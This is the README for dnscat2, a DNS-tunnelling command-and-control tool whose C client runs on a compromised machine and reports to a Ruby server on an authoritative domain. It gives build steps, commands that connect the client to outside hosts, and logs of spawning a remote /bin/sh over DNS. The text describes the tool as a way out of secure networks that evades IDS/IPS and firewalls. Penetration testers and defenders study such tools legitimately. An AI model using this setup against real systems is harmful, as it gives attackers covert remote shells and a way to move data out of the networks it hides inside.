# Introduction

Welcome to dnscat2, a DNS tunnel that WON'T make you sick and kill you!

This tool is designed to create a command-and-control (C&C) channel over
the DNS protocol, which is an effective tunnel out of almost every
network.

This README file should contain everything you need to get up and
running! If you're interested in digging deeper into the protocol, how
the code is structured, future plans, or other esoteric stuff, check
out the doc/ folder.

# License

This is released under the BSD license. See [LICENSE.md](LICENSE.md) for
more information.

# Overview

dnscat2 comes in two parts: the client and the server.

The client is designed to be run on a compromised machine. It's written
in C and has the minimum possible dependencies. It should run just about
anywhere (if you find a system where it doesn't compile or run, please
file a ticket, particularly if you can help me get access to said
system).

When you run the client, you typically specify a domain name. All
requests will be sent to the local DNS server, which are then redirected
to the authoritative DNS server for that domain (which you, presumably,
have control of).

If you don't have an authoritative DNS server, you can also use direct
connections on UDP/53 (or whatever you choose). They'll be faster, and
still look like DNS traffic to the casual viewer, but it's much more
obvious in a packet log (all domains are prefixed with "dnscat.", unless
you hack the source). This mode will frequently be blocked by firewalls.

The server is designed to be run on an [authoritative DNS
server](authoritative_dns_setup.md). It's in ruby, and depends on
several different gems. When you run it, much like the client, you
specify which domain(s) it should listen for in addition to listening
for messages sent directly to it on UDP/53. When it receives traffic for
one of those domains, it attempts to establish a logical connection.  If
it receives other traffic, it ignores it by default, but can also
forward it upstream.

Detailed instructions for both parts are below.

# How is this different from .....

dnscat2 strives to be different from other DNS tunneling protocols by
being designed for a special purpose: command and control.

This isn't designed to get you off a hotel network, or to get free
Internet on a plane. And it doesn't just tunnel TCP.

It can tunnel any data, with no protocol attached. Which means it can
upload and download files, it can run a shell, and it can do those
things well. It can also potentially tunnel TCP, but that's only going
to be added in the context of a pen-testing tool (that is, tunneling TCP
into a network), not as a general purpose tunneling tool. That's been
done, it's not interesting (to me).

# Where to get it

Here are some important links:

* [Sourcecode on Github](https://github.com/iagox86/dnscat2)
* [Downloads](https://downloads.skullsecurity.org/dnscat2/) (you'll find [signed](https://downloads.skullsecurity.org/ron.pgp) Linux 32-bit, Linux 64-bit, Win32, and source code versions of the client, plus an archive of the server - keep in mind that that signature file is hosted on the same server as the files, so if you're worried, please verify my PGP key :) )
* [User documentation](https://github.com/iagox86/dnscat2/blob/master/README.md) (this file)
* [Protocol](https://github.com/iagox86/dnscat2/blob/master/doc/protocol.md) and [command protocol](https://github.com/iagox86/dnscat2/blob/master/doc/command_protocol.md) documents (as a user, you probably don't need these)
* [Issue tracker](https://github.com/iagox86/dnscat2/issues) (you can also email me issues, just put my first name (ron) in front of my domain name (skullsecurity.net))

# How to play

The theory behind dnscat2 is simple: it creates a tunnel over the DNS
protocol.

Why? Because DNS has an amazing property: it'll make its way from server
to server until it figures out where it's supposed to go.

That means that for dnscat to get traffic off a secure network, it
simply has to send messages to *a* DNS server, which will happily
forward things through the DNS network until it gets to *your* DNS
server.

That, of course, assumes you have access to an authoritative DNS server.
dnscat2 also supports "direct" connections - that is, running a dnscat
client that directly connects to your dnscat on your ip address and UDP
port 53 (by default). The traffic still looks like DNS traffic, and
might get past dumber IDS/IPS systems, but is still likely to be stopped
by firewalls.

If you aren't clear on how to set up an authoritative DNS server, it's
something you have to set up with a domain provider.
[izhan](https://github.com/izhan) helpfully [wrote
one](https://github.com/iagox86/dnscat2/blob/master/doc/authoritative_dns_setup.md)
for you!

## Compiling

### Client

Compiling the client should be pretty straight forward - all you should
need to compile is make/gcc (for Linux) or either Cygwin or Microsoft
Visual Studio (for Windows). Here are the commands on Linux:

    $ git clone https://github.com/iagox86/dnscat2.git
    $ cd dnscat2/client/
    $ make

On Windows, load client/win32/dnscat2.vcproj into Visual Studio and hit
"build". I created and test it on Visual Studio 2008 - until I get a
free legit copy of a newer version, I'll likely be sticking with that
one. :)

If compilation fails, please file a bug on my [github
page](https://github.com/iagox86/dnscat2/issues)! Please send details
about your system.

You can verify dnscat2 is successfully compiled by running it with no
flags; you'll see it attempting to start a DNS tunnel with whatever your
configured DNS server is (which will fail):

    $ ./dnscat
    Starting DNS driver without a domain! This will only work if you
    are directly connecting to the dnscat2 server.
    
    You'll need to use --dns server=<server> if you aren't.
    Creating DNS driver:
     domain = (null)
     host   = 0.0.0.0
     port   = 53
     type   = TXT,CNAME,MX
     server = 127.0.1.1
    [[ ERROR ]] :: DNS: RCODE_NAME_ERROR
    [[ ERROR ]] :: DNS: RCODE_NAME_ERROR
    ^c

### Server

The server isn't "compiled", as such, but it does require some Ruby
dependencies. Unfortunately, Ruby dependencies can be annoying to get
working, so good luck! If any Ruby experts out there want to help make
this section better, I'd be grateful!

I'm assuming you have Ruby and Gem installed and in working order. If
they aren't, install them with either `apt-get`, `emerge`, `rvm`, or
however is normal on your operating system.

Once Ruby/Gem are sorted out, run these commands (note: you can
obviously skip the `git clone` command if you already installed the
client and skip `gem install bundler` if you've already installed
bundler):

    $ git clone https://github.com/iagox86/dnscat2.git
    $ cd dnscat2/server/
    $ gem install bundler
    $ bundle install

If you get a permissions error with `gem install bundler` or `bundler
install`, you may need to run them as root. If you have a lot of
problems, uninstall Ruby/Gem and install everything using `rvm` and
without root.

If you get an error that looks like this:

    /usr/lib/ruby/1.9.1/rubygems/custom_require.rb:36:in `require': cannot load such file -- mkmf (LoadError)

It means you need to install the -dev version of Ruby:

    $ sudo apt-get install ruby-dev

I find that `sudo` isn't always enough to get everything working right,
I sometimes have to switch to root and work directly as that account.
`rvm` largely fixes that problem.

You can verify the server is working by running it with no flags and
seeing if you get a dnscat2> prompt:

    $ ruby ./dnscat2.rb
    Setting debug level to: WARNING
    It looks like you didn't give me any domains to recognize!
    That's cool, though, you can still use a direct connection.
    Try running this on your client:
    
    ./dnscat2 --dns server=<server>
    
    Of course, you have to figure out <server> yourself! Clients will
    connect directly on UDP port 53 (by default).
    
    Set debug level to warning
    Starting DNS server...
    Starting Dnscat2 DNS server on 0.0.0.0:53 [domains = n/a]...
    No domains were selected, which means this server will only respond to
    direct queries (using --host and --port on the client)

If you don't run it as root, you might have trouble listening on UDP/53
(you can use --dnsport to change it). You'll see a stacktrace and a
warning at the bottom if that's the case.

If anybody has a better guide on how to get the Ruby dependencies,
please don't hesitate to send me a better guide or a pull request! I
find the Ruby dependency system confusing, which means I'm probably
using it wrong. :)

## Usage

### Client + server

Before we talk about how to specifically use the tools, let's talk about
how dnscat is structured. The dnscat tool is divided into two pieces: a
client and a server. As you noticed if you went through the compilation,
the client is written in C and the server is in Ruby.

Generally, the server is run first. It can be long lived, and handle as
many clients as you'd like. As I said before, it's basically a C&C
service.

Later, a client is run, which opens a session with the server (more on
sessions below). The session can either traverse the DNS hierarchy
(recommended, but more complex) or connect directly to the server.
Traversing the DNS hierarchy requires an authoritative domain, but will
bypass most firewalls. Connecting directly to the server is more
obvious for several reasons.

### Running a server

The server - which is typically run on the authoritative DNS server for
a particular domain - is designed to be feature-ful, interactive, and
user friendly. It's written in Ruby, and much of its design is inspired
by Metasploit and Meterpreter.

If you followed the compilation instructions above, you should be able
to just run the server:

    $ ruby ./dnscat2.rb skullseclabs.org

Where "skullseclabs.org" is your own domain. If you don't have an
authoritative DNS server, just leave it off and the server will only
respond to queries sent directly to it.

That should actually be all you need! Other than that, you can test it
using the client's --ping command on any other system, which should be
available if you've compiled it:

    $ ./dnscat --ping skullseclabs.org

If the ping succeeds, your C&C server is probably good! If you ran the
DNS server on a different port, or if you need to use a custom DNS
resolver, you can use the --dns flag in addition to --ping:

    $ ./dnscat --dns server=8.8.8.8 --ping skullseclabs.org

    $ ./dnscat --dns port=53531,server=localhost --ping skullseclabs.org

### Running a client

The client - which is typically run on a system after compromising it -
is designed to be simple, stable, and portable. It's written in C and
has as few library dependencies as possible, and compiles/runs natively
on Linux, Windows, Cygwin, FreeBSD, and Mac OS X.

The client is given the domain name on the commandline, for example:

    ./dnscat2 skullseclabs.org

In that example, it will create a C&C session with the dnscat2 server
running on skullseclabs.org. If an authoritative domain isn't an option,
it can be given a specific ip address to connect to instead:

    ./dnscat2 --dns host=206.220.196.59,port=5353

Assuming there's a dnscat2 server running on that host/port, it'll
create a session there.

### Sessions

I used the term "session" earlier - let's talk about sessions! A session
is a single virtual "connection" between a client and a server,
identified by a 16-bit session_id value. A client can maintain multiple
sessions with a single server (this happens when you spawn a shell from
within a command session, for example). A server can maintain multiple
sessions with multiple clients. Think of it as kind of a hub where all
the connections come back to!

There are several different types of sessions, but the default one -
which I call a "command session" - is usually what you want (since the
other ones can be created via that command session). If you want to play
with other session types, you can pass --console or --exec to the dnscat
client (the server will recognize the type automatically). Technically,
--ping is also a session type, but it's handled specially.

When you run dnscat2, you'll see a simple prompt:

    dnscat2>

You can list the sessions using the `sessions` command (initially,
there's only the one):

    dnscat2> sessions
    command window <-- You are here!
    dnscat2>

When a new session is created, you'll be informed:

    dnscat2> sessions
    command window <-- You are here!
    dnscat2>
    New session established: 19334
    
    dnscat2> sessions
    command window <-- You are here!
     session 19334 :: command (default)

You can interact with these sessions using the `session -i` command:

    dnscat2> session -i 19334
    
    Welcome to a command session! Use 'help' for a list of commands or ^z
    for the main menu
    dnscat [command: 19334]>

These sessions can spawn further sessions:

    dnscat [command: 28993]> shell
    Sent request to execute a shell
    dnscat [command: 28993]>
    New session established: 22670
    dnscat [command: 28993]> sessions
    Sessions:
    
    command window
     session 28993 :: command (default) <-- You are here!
     session 22670 [*] :: sh

If you want to go "back" to a parent session, use either ctrl-z or the
"back" command:

    dnscat [command: 28993]> back
    
    dnscat2>

Note that some sessions have `[*]` - that means that there's been
activity since the last time we looked at them.

When you interact with a session, the interface will look different
depending on the session type. As you saw with the default session type
(command sessions) you get a UI just like the top-level virtual session
(you can type 'help' or run commands or whatever). However, if you
interact with a 'shell' session, you won't see much immediately,
until you type a command:

    dnscat2> session -i 22670
    
    Welcome to session 22670! If it's a shell session and you're not seeing
    output, try typing "pwd" or something!
    
    pwd
    /home/ron/tools/dnscat2/client

To escape this, you can use ctrl-z or type "exit" (which will kill the
session).

You can start a shell directly by running the dnscat2 client with the
--exec flag:

    $ ./dnscat --exec /bin/sh --dns server=localhost,port=53531

On the server, you'll see a session created as usual:

    dnscat2>
    New session established: 1387
    
    Unknown command: sessoin
    dnscat2> sessions
    command window <-- You are here!
     session 28993 :: command (default)
     session 22670 :: sh
     session 1387 [*] :: /bin/sh

And you can interact with it as normal:

    dnscat2> session -i $newest
    
    pwd
    /home/ron/tools/dnscat2/client

(Note that I used a variable - $newest - which always refers to the most
recent session! See other variables by running `set`)

Lastly, to kill a session, the `kill` command can be used:

    dnscat2> sessions
    command window <-- You are here!
     session 28993 :: command (default)
     session 22670 :: sh
     session 1387 [*] :: /bin/sh
    dnscat2> 
    dnscat2> kill 22670
    Session killed
    dnscat2> sessions
    command window <-- You are here!
     session 28993 :: command (default)
     session 22670 [*] :: sh :: [idle for 13 seconds]
     session 1387 [*] :: /bin/sh

# History

dnscat2 - the successor to dnscat, also written by me - is an attempt to
right some of the wrongs that I committed while writing the original
version of dnscat. The biggest problem being a total lack of testing or
of forethought into the protocol.

The original dnscat was heavily linked to the dns protocol. It tried to
encode the various control fields - things like sequence number - into
the DNS protocol directly.

dnscat2, on the other hand, treats everything as a stream of bytes, and
uses logic to convert that stream of bytes into dns requests. Thus, it's
a layered protocol, with DNS being a lower layer.

I invented a protocol that I'm calling the dnscat protocol. You can find
documentation about it in docs/protocol.md. It's a simple polling
network protocol, where the client occasionally polls the server, and
the server responds with a message (or an error code). The protocol is
designed to be resilient to the various issues I had with dnscat1 - that
is, it can handle out-of-order packets, dropped packets, and duplicated
packets equally well.

Finally, one last change from the original dnscat is that I decided not
to use the same program for both clients and servers. It turns out that
dnscat servers are much more complex than clients, so it made sense to
write the server in a higher level language (I chose Ruby), while still
keeping the client (written in C) as functional/simple/portable as I
possibly could.
